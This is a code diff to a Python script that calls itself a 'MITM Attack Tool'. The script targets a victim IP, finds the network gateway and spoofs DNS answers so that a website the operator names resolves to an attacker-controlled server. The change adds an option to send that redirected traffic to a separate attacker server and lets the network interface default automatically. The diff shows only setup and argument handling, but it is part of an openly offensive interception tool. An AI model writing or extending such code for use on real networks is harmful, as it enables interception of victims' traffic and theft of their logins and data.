@@ -36,6 +36,7 @@ import http.client        # For making HTTP/HTTPS connections to real servers
 CONFIG = {
     "ATTACKER_IP": None,   # IP address of the attacker machine
     "INTERFACE": None,     # Network interface to use (e.g., wlp0s20f3, eth0)
+    "SERVER_IP": None,     # IP address of the server of the attacker
     "VICTIM_IP": None,     # IP address of the target victim
     "MODE": None           # Attack mode: SILENT (targeted) or ALL_OUT (aggressive)
 }
@@ -755,9 +756,10 @@ def setup_and_run():
     
     # Parse command line arguments
     parser = argparse.ArgumentParser(prog="MITM Attack Tool")
-    parser.add_argument("--interface", type=str, required=True)
+    parser.add_argument("--interface", default=conf.iface)
     parser.add_argument("--mode", choices=["SILENT", "ALL_OUT"], required=True)
     parser.add_argument("--target", required=True)
+    parser.add_argument("--server", default=None)
     args = parser.parse_args()
     
     # Get attacker's IP address from interface
@@ -767,6 +769,11 @@ def setup_and_run():
     except:
         print(f"[!] Cannot get IP for {args.interface}")
         sys.exit(1)
+
+    if args.server is None:
+        CONFIG['SERVER_IP'] = CONFIG['ATTACKER_IP']
+    else:
+        CONFIG['SERVER_IP'] = args.server
     
     # Set attack mode
     CONFIG['MODE'] = args.mode
@@ -777,8 +784,8 @@ def setup_and_run():
         website = input("[SETUP] Website: ").strip()
         if not website.endswith('.'):
             website += '.'
-        SPOOF_MAP[website] = CONFIG['ATTACKER_IP']
-        print(f"[SETUP] {website} -> {CONFIG['ATTACKER_IP']}")
+        SPOOF_MAP[website] = CONFIG['SERVER_IP']
+        print(f"[SETUP] {website} -> {CONFIG['SERVER_IP']}")
     
     # Find gateway and validate target IP
     GATEWAY_IP = find_gateway()
